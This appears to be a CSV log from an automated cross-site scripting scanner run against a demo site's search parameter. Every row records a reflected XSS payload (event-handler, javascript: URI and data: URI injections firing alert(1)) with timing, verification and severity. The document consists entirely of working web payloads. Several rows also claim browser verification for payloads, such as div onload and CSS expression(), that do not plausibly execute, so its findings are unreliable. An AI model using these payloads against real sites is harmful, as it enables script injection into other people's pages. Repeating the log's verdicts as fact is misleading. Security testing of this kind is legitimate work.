Payload_Start_Time,Payload_End_Time,Duration_Seconds,Target_URL,HTTP_Method,Parameter,Payload,Reflection_Type,Browser_Verified,XSS_Event_Type,Severity
2026-01-10 17:58:52.904,2026-01-10 17:58:53.240,0.337,https://demo-knsl.onrender.com/search,GET,q,<input type=image src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:53.130,2026-01-10 17:58:53.257,0.127,https://demo-knsl.onrender.com/search,GET,q,<embed src=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:53.230,2026-01-10 17:58:53.333,0.103,https://demo-knsl.onrender.com/search,GET,q,<keygen onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:53.186,2026-01-10 17:58:53.334,0.148,https://demo-knsl.onrender.com/search,GET,q,"<object data=""data:text/html,<script>alert(1)</script>"">",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:53.216,2026-01-10 17:58:53.338,0.122,https://demo-knsl.onrender.com/search,GET,q,<select onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:53.236,2026-01-10 17:58:53.373,0.138,https://demo-knsl.onrender.com/search,GET,q,<marquee onstart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:53.240,2026-01-10 17:58:53.377,0.137,https://demo-knsl.onrender.com/search,GET,q,<marquee loop=1 onfinish=alert(1)>x</marquee>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:53.257,2026-01-10 17:58:53.383,0.126,https://demo-knsl.onrender.com/search,GET,q,<video src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:52.641,2026-01-10 17:58:53.414,0.773,https://demo-knsl.onrender.com/search,GET,q,<body onfocus=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 17:58:53.334,2026-01-10 17:58:53.446,0.113,https://demo-knsl.onrender.com/search,GET,q,<video><source onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:53.338,2026-01-10 17:58:53.450,0.112,https://demo-knsl.onrender.com/search,GET,q,<link rel=stylesheet href=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:53.225,2026-01-10 17:58:53.462,0.238,https://demo-knsl.onrender.com/search,GET,q,<textarea onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:53.373,2026-01-10 17:58:53.481,0.107,https://demo-knsl.onrender.com/search,GET,q,<a href=javascript:alert(1)>click</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:53.377,2026-01-10 17:58:53.486,0.109,https://demo-knsl.onrender.com/search,GET,q,"<a href=""javascript:alert(1)"">click</a>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:53.383,2026-01-10 17:58:53.491,0.108,https://demo-knsl.onrender.com/search,GET,q,<form action=javascript:alert(1)><input type=submit>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:53.414,2026-01-10 17:58:53.553,0.140,https://demo-knsl.onrender.com/search,GET,q,<form><button formaction=javascript:alert(1)>X</button>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:52.831,2026-01-10 17:58:53.580,0.749,https://demo-knsl.onrender.com/search,GET,q,<input onblur=alert(1) autofocus><input>,RAW_REFLECTION,No,,High
2026-01-10 17:58:53.446,2026-01-10 17:58:53.585,0.139,https://demo-knsl.onrender.com/search,GET,q,<form><input formaction=javascript:alert(1) type=submit value=X>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:53.450,2026-01-10 17:58:53.585,0.135,https://demo-knsl.onrender.com/search,GET,q,<meta http-equiv=refresh content=0;url=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:53.481,2026-01-10 17:58:53.592,0.111,https://demo-knsl.onrender.com/search,GET,q,<style>*{background:url('javascript:alert(1)')}</style>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:53.491,2026-01-10 17:58:53.600,0.109,https://demo-knsl.onrender.com/search,GET,q,<style onload=alert(1)></style>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:53.486,2026-01-10 17:58:53.622,0.136,https://demo-knsl.onrender.com/search,GET,q,<style>@import'javascript:alert(1)';</style>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:53.553,2026-01-10 17:58:53.669,0.115,https://demo-knsl.onrender.com/search,GET,q,<math><mi xlink:href=javascript:alert(1)>X</mi></math>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:53.580,2026-01-10 17:58:53.696,0.116,https://demo-knsl.onrender.com/search,GET,q,<table background=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:53.585,2026-01-10 17:58:53.703,0.118,https://demo-knsl.onrender.com/search,GET,q,<div onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:53.585,2026-01-10 17:58:53.704,0.119,https://demo-knsl.onrender.com/search,GET,q,<table><td background=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:53.592,2026-01-10 17:58:53.711,0.119,https://demo-knsl.onrender.com/search,GET,q,<div style=width:expression(alert(1))>,RAW_REFLECTION,Yes,alert,Critical
